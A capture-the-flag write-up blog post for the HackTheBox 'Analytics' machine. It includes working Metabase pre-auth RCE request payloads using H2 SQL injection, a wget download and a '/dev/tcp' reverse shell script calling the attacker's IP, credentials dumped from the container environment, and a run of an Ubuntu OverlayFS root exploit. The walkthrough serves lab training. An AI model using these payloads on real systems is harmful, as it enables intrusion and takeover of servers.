---
layout: post
title: Analytical HackTheBox Writeup - Metabase Pre auth RCE and Gameoverlay Ubuntu Privilege Escalation
date: 21/10/2023
author: Nehal Zaman
tags: ["metabase pre auth rce", "gameoverlay ubuntu exploit", "CVE-2023-2640", "CVE-2023-32629"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/analytics/banner.png)

# Introduction

Welcome to the **Analytics**, a Linux box by [7u9y](https://app.hackthebox.com/users/260996) and [TheCyberGeek](https://app.hackthebox.com/users/114053) on [HackTheBox](https://app.hackthebox.com/). 

We'll kick things off with a pre-authentication Remote Code Execution (`RCE`) exploit in `Metabase`, enabling us to take control of the system even before logging in. 

Then, we'll bust out of Docker, by making use of hidden credentials.

Finally, we'll up our game by exploiting `gameoverlay` on an `Ubuntu` system, which means boosting our privileges.

So, let's roll up our sleeves and get technical!

# SCANNING

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.11.233 -r 1-65535 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.233:22
Open 10.10.11.233:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-21 10:09 EDT
Initiating Ping Scan at 10:09
Scanning 10.10.11.233 [2 ports]
Completed Ping Scan at 10:09, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:09
Completed Parallel DNS resolution of 1 host. at 10:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:09
Scanning 10.10.11.233 [2 ports]
Discovered open port 80/tcp on 10.10.11.233
Discovered open port 22/tcp on 10.10.11.233
Completed Connect Scan at 10:09, 0.16s elapsed (2 total ports)
Nmap scan report for 10.10.11.233
Host is up, received syn-ack (0.16s latency).
Scanned at 2023-10-21 10:09:23 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

`Rustscan` swiftly identified that ports 22 and 80 were accessible.

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p22,80 10.10.11.233 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-21 10:10 EDT
Nmap scan report for 10.10.11.233
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```

Port `22` was hosting `SSH`, running **OpenSSH 8.9p1** on an Ubuntu system.

Port `80` served as a web interface, powered by **nginx** `1.18.0` on Ubuntu.

Furthermore, `nmap` revealed a domain name, `analytical.htb`, which we added to our `/etc/hosts` file for future reference.

# ENUMERATING WEB

![](/assets/images/writeups/analytics/1.png)

Upon visiting the website, we found it to be a static one with no interactive features for users.

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://10.10.11.233 -w ~/Documents/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt                                                 

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/kali/reports/http_10.10.11.233/_23-10-21_10-20-19.txt

Target: http://10.10.11.233/

[10:20:19] Starting: 
                                                                              
Task Completed
```

We used `dirsearch` to search for potential hidden directories or files on the website. However, this scan did not yield any interesting results, and we didn't discover any noteworthy endpoints.

# FUZZING VHOST

Using `wfuzz`, we attempted to discover subdomains by trying many different possibilities. In this case, we targeted the domain `analytical.htb` with different variations using the `Host` header.

```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt -H "Host: FUZZ.analytical.htb" --hw 10 10.10.11.233
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.233/
Total requests: 20000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000149:   200        27 L     3538 W     77677 Ch    "data"                                                                                                                      
                                                                                                 

Total time: 406.9246
Processed Requests: 20000
Filtered Requests: 19999
Requests/sec.: 49.14914
```

Our fuzzing operation revealed a subdomain, `data.analytical.htb`, which we added to our `/etc/hosts` file.

# ENUMERATING VHOST

![](/assets/images/writeups/analytics/2.png)

As we delved deeper, we discovered the subdomain named `data.analytical.htb`, hosted an application called `Metabase`. 

Metabase is a tool used for business intelligence, helping users analyze data in various ways.

# PRE AUTH RCE IN METABASE

However, our focus turned to potential vulnerabilities in `Metabase`. 

Our exploration led us to a [blog post](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) by the security research team at `Assetnote`. They concentrated on Metabase due to its previous vulnerabilities and widespread use.

Their investigation revealed a critical pre-auth `RCE` (**Remote Code Execution**) vulnerability. This flaw could allow an attacker to access sensitive data sources. It was related to the `setup-token`, which should have been restricted to authenticated users but was accessible even to unauthenticated users at `/api/session/properties`.

```
GET /api/session/properties HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://data.analytical.htb/auth/login?redirect=%2F
Cookie: metabase.DEVICE=4dfa8070-4391-4a8d-b301-b402e4c0b274

```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 21 Oct 2023 15:26:10 GMT
Content-Type: application/json;charset=utf-8
Connection: close
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Last-Modified: Sat, 21 Oct 2023 15:26:10 GMT
Strict-Transport-Security: max-age=31536000
X-Permitted-Cross-Domain-Policies: none
Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval' https://maps.google.com https://accounts.google.com    'sha256-K2AkR/jTLsGV8PyzWha7/ey1iaD9c5jWRYwa++ZlMZc=' 'sha256-ib2/2v5zC6gGM6Ety7iYgBUvpy/caRX9xV/pzzV7hf0=' 'sha256-isH538cVBUY8IMlGYGbWtBwr+cGqkc4mN6nLcA7lUjE='; child-src 'self' https://accounts.google.com; style-src 'self' 'unsafe-inline' https://accounts.google.com; font-src *; img-src * 'self' data:; connect-src 'self' https://accounts.google.com metabase.us10.list-manage.com   ; manifest-src 'self';  frame-ancestors 'none';
Expires: Tue, 03 Jul 2001 06:00:00 GMT
Content-Length: 74478

{"engines":{
.
.
SNIP
.
.
"landing-page":"","setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f","application-colors":{},
.
.
SNIP
.
.
```

The exposure of the `setup-token` posed a severe threat, as it allowed unauthorized access to sensitive data sources. The team carefully analyzed the Metabase code and its historical commits to understand the root cause of this issue.

To achieve `RCE`, they used a specific payload to perform an `SQL injection` attack on the `H2` database driver. This injection led to code execution, and they obtained a reverse shell on the system.

```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://data.analytical.htb/auth/login?redirect=%2F
Cookie: metabase.DEVICE=4dfa8070-4391-4a8d-b301-b402e4c0b274
Content-Length: 749

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('ping -c 4 10.10.14.177')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:40:37.304882 IP analytical.htb > 10.10.14.177: ICMP echo request, id 2, seq 0, length 64
11:40:37.304908 IP 10.10.14.177 > analytical.htb: ICMP echo reply, id 2, seq 0, length 64
11:40:38.312003 IP analytical.htb > 10.10.14.177: ICMP echo request, id 2, seq 1, length 64
11:40:38.312049 IP 10.10.14.177 > analytical.htb: ICMP echo reply, id 2, seq 1, length 64
11:40:39.309406 IP analytical.htb > 10.10.14.177: ICMP echo request, id 2, seq 2, length 64
11:40:39.309420 IP 10.10.14.177 > analytical.htb: ICMP echo reply, id 2, seq 2, length 64
11:40:40.309391 IP analytical.htb > 10.10.14.177: ICMP echo request, id 2, seq 3, length 64
11:40:40.309405 IP 10.10.14.177 > analytical.htb: ICMP echo reply, id 2, seq 3, length 64
```

By testing with a simple `ping` command, we confirmed that the RCE was successful. Our box received ping responses from the target, validating the presence of the remote code execution.

# DOCKER BREAKOUT

```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://data.analytical.htb/auth/login?redirect=%2F
Cookie: metabase.DEVICE=4dfa8070-4391-4a8d-b301-b402e4c0b274
Content-Length: 781

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('wget http://10.10.14.177/exploit.sh -O /tmp/exploit.sh')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

To gain a reverse shell, we created a shell script.

```bash
┌──(kali㉿kali)-[~]
└─$ cat exploit.sh                                                                                                                                                                           
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.177/443 0>&1' &
```

This script, when executed, would give us a reverse shell, allowing us to interact with the target system. We transferred this script to the `/tmp` directory using `wget`.

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.233 - - [21/Oct/2023 11:51:46] "GET /exploit.sh HTTP/1.1" 200 -
```

Once the script was ready, we set up a simple web server to serve it. The target system fetched the script via `HTTP`.

```
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Referer: http://data.analytical.htb/auth/login?redirect=%2F
Cookie: metabase.DEVICE=4dfa8070-4391-4a8d-b301-b402e4c0b274
Content-Length: 747

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash /tmp/exploit.sh')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.177] from (UNKNOWN) [10.10.11.233] 58382
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
45ea7123cf94:/$ ls -al /
ls -al /
total 88
drwxr-xr-x    1 root     root          4096 Oct 21 15:36 .
drwxr-xr-x    1 root     root          4096 Oct 21 15:36 ..
-rwxr-xr-x    1 root     root             0 Oct 21 15:36 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 29 20:40 app
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 bin
drwxr-xr-x    5 root     root           340 Oct 21 15:36 dev
drwxr-xr-x    1 root     root          4096 Oct 21 15:36 etc
drwxr-xr-x    1 root     root          4096 Aug  3 12:16 home
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 lib
drwxr-xr-x    5 root     root          4096 Jun 14 15:03 media
drwxr-xr-x    1 metabase metabase      4096 Aug  3 12:17 metabase.db
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 mnt
drwxr-xr-x    1 root     root          4096 Jun 15 05:12 opt
drwxrwxrwx    1 root     root          4096 Aug  7 11:10 plugins
dr-xr-xr-x  211 root     root             0 Oct 21 15:36 proc
drwx------    1 root     root          4096 Aug  3 12:26 root
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 run
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 sbin
drwxr-xr-x    2 root     root          4096 Jun 14 15:03 srv
dr-xr-xr-x   13 root     root             0 Oct 21 15:36 sys
drwxrwxrwt    1 root     root          4096 Oct 21 15:51 tmp
drwxr-xr-x    1 root     root          4096 Jun 29 20:39 usr
drwxr-xr-x    1 root     root          4096 Jun 14 15:03 var
45ea7123cf94:/$ 

```

The script successfully executed, and we received a reverse shell. However, we noticed that we were within a Docker shell. This was evident from the presence of the file `.dockerenv` in root directory.

```
45ea7123cf94:/$ env                                                                                                                                                                          
env                                                                                                                                                                                          
SHELL=/bin/sh                                                                                                                                                                                
MB_DB_PASS=                                                                                                                                                                                  
HOSTNAME=45ea7123cf94                                                                                                                                                                        
LANGUAGE=en_US:en                                                                                                                                                                            
MB_JETTY_HOST=0.0.0.0                                                                                                                                                                        
JAVA_HOME=/opt/java/openjdk                                                                                                                                                                  
MB_DB_FILE=//metabase.db/metabase.db                                                                                                                                                         
PWD=/                                                                                                                                                                                        
LOGNAME=metabase                                                                                                                                                                             
MB_EMAIL_SMTP_USERNAME=                                                                                                                                                                      
HOME=/home/metabase                                                                                                                                                                          
LANG=en_US.UTF-8                                                                                                                                                                             
META_USER=metalytics                                                                                                                                                                         
META_PASS=An4lytics_ds20223#                                                                                                                                                                 
MB_EMAIL_SMTP_PASSWORD=                                                                                                                                                                      
USER=metabase                                                                                                                                                                                
SHLVL=3
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
45ea7123cf94:/$ 
```

But within this `Docker` environment, we discovered some critical information in the form of environment variables. Notably, we found the `META_USER` and `META_PASS` variables, which held the credentials we needed. 

With these credentials, we could potentially log into the main host using `SSH`.

```
┌──(kali㉿kali)-[~]
└─$ ssh metalytics@analytical.htb
metalytics@analytical.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 21 04:04:02 PM UTC 2023

  System load:              0.17822265625
  Usage of /:               92.9% of 7.78GB
  Memory usage:             25%
  Swap usage:               0%
  Processes:                153
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:694c

  => / is using 92.9% of 7.78GB

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ id; whoami
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics
metalytics@analytics:~$ 

```

# PRIVILEGE ESCALATION

```
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

For privilege escalation, we first checked the system information using the `uname -a` command. It revealed that the target system was running `Ubuntu` with kernel version `6.2.0-25-generic`.

A quick online search led us to a [blog post](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability) that discussed two specific privilege escalation vulnerabilities, namely `CVE-2023-2640` and `CVE-2023-32629`, found in the `OverlayFS` module of `Ubuntu`. These vulnerabilities were unique to `Ubuntu` due to modifications made to the `OverlayFS` module. Exploiting these vulnerabilities allowed attackers to create specialized executables that could provide root-like privileges to anyone who ran them.

We found [this](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh) public exploit on github.

```
metalytics@analytics:~$ wget http://10.10.14.177/exploit.sh
--2023-10-21 16:22:03--  http://10.10.14.177/exploit.sh
Connecting to 10.10.14.177:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 558 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                      100%[====================================================================================================>]     558  --.-KB/s    in 0.002s  

2023-10-21 16:22:03 (300 KB/s) - ‘exploit.sh’ saved [558/558]
```

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80                                                                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.233 - - [21/Oct/2023 12:22:01] "GET /exploit.sh HTTP/1.1" 200 -
```

After the transfer, we set up a simple web server to serve the exploit script. The target system fetched the script via `HTTP`.

```
metalytics@analytics:~$ chmod +x exploit.sh 
metalytics@analytics:~$ 
metalytics@analytics:~$ id; whoami
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics
metalytics@analytics:~$ 
metalytics@analytics:~$ ./exploit.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:~# 
root@analytics:~# id; whoami
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root
root@analytics:~# 

```

Finally, we made the exploit script executable and ran it. As a result, we obtained a `root` shell, confirming successful privilege escalation.

# CONCLUSION

Our journey started with exploiting a pre-authentication **Remote Code Execution** (`RCE`) vulnerability in `Metabase`. This allowed us to make initial progress.

We then found ourselves in a `Docker` shell, but we didn't stop there. We discovered hardcoded credentials in `environment` variables, which helped us break free from the Docker environment.

To achieve full control of the system, we took advantage of a vulnerability in `OverlayFS` specific to `Ubuntu`, elevating our privileges to the `root` level.

And that's a wrap for this box! 

Thank you for reading along on this adventure. See you in the next one.